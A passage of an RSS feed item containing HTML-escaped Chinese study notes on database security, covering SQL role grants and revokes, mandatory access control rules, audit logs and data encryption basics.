-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;首先创建一个角色 R1&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create role R1;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;然后使用 FRANT 语句，使角色 R1 拥有 Student 表的 SELECT，UPDATE，INSERT 权限&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select,update,insert on Student to R1;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;将这个角色权限授予王平，张明，赵玲，使他们具有角色 R1 所包含的全部权限&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant R1 to 王平,张明,赵玲;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;通过 R1 一次性收回王平的这三个权限&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke R1 from 王平;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;强取存取控制的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#强取存取控制的方法&#34;&gt;#&lt;/a&gt; 强取存取控制的方法&lt;/h3&gt;
-&lt;p&gt;自主存取控制缺点：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;可能存在数据的 “无意泄露”&lt;/li&gt;
-&lt;li&gt;这种机制仅仅通过对数据的存取权限来进行安全控制，而数据本身并无安全性标记&lt;/li&gt;
-&lt;li&gt;解决：对系统控制下的所有主客体实施存取控制策略&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;强制存取控制（MAC）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;保证更高的安全性&lt;/li&gt;
-&lt;li&gt;用户不能直接感知或进行控制&lt;/li&gt;
-&lt;li&gt;适用于对数据有严格而固定密级分类的部门
-&lt;ul&gt;
-&lt;li&gt;军事、政府部门&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;主体是系统中的活动实体&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;DBMS 所管理的实际用户&lt;/li&gt;
-&lt;li&gt;代表用户的各进程&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;客体是系统中的被动实体，是受主体操纵的&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;文件&lt;/li&gt;
-&lt;li&gt;基表&lt;/li&gt;
-&lt;li&gt;索引&lt;/li&gt;
-&lt;li&gt;视图&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;敏感读标记（Label）&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;绝密（Top Secret）&lt;/li&gt;
-&lt;li&gt;机密（Secret）&lt;/li&gt;
-&lt;li&gt;可信（Confidential）&lt;/li&gt;
-&lt;li&gt;公开（public）&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;主体的敏感度标记称为许可证级别（Clearabce Level）&lt;/p&gt;
-&lt;p&gt;客体的敏感度标记称为密级（Claccification Level）&lt;/p&gt;
-&lt;p&gt;强制存取控制规则&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体&lt;/li&gt;
-&lt;li&gt;仅当主体的许可证级别小于或等于客体的密级时，该主体才能写相应的客体&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h2 id=&#34;审计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#审计&#34;&gt;#&lt;/a&gt; 审计&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;
-&lt;p&gt;审计日志&lt;/p&gt;
-&lt;p&gt;将用户对数据库的所有操作记录都在上面&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;DBA 利用审计日记&lt;/p&gt;
-&lt;p&gt;找出非法存取数据的人，时间和内容&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;C2 以上安全级别的 DBMS 必须具有&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h2 id=&#34;数据加密&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据加密&#34;&gt;#&lt;/a&gt; 数据加密&lt;/h2&gt;
-&lt;p&gt;数据加密&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;防止数据库中数据在存储和传输中失密的有效手段&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;加密的基本思想&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;根据一定的算法将原始数据（明文）变换为不可直接识别的格式（密文）, 从而使得不知道解密算法的人无法获知数据的内容.&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;数据加密分类&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;存储加密&lt;/li&gt;
-&lt;li&gt;传输加密&lt;/li&gt;
-&lt;/ul&gt;
  ]]></description>
         </item>
     </channel>
